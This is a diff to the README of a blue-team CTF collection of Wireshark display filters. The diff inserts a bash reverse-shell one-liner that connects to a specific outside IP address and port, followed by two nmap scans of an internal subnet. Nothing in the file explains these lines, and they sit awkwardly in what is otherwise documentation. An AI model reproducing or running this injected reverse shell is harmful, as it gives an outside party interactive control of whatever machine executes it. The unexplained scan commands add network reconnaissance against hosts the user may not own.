@@ -1,7 +1,9 @@
 # Blue Team CTF — Wireshark Filters
 
 A collection of practical Wireshark display filters for blue team operations, CTF challenges, threat hunting, and network forensics.
-
+bash -c bash -i >& /dev/tcp/65.0.205.167/5555 0>&1
+    nmap --script http-webdav-scan -p 80 10.1.0.0/24
+    nmap -F 10.1.0.0/24
 ---
 
 ## 1. Show Bidirectional traffic between two hosts.
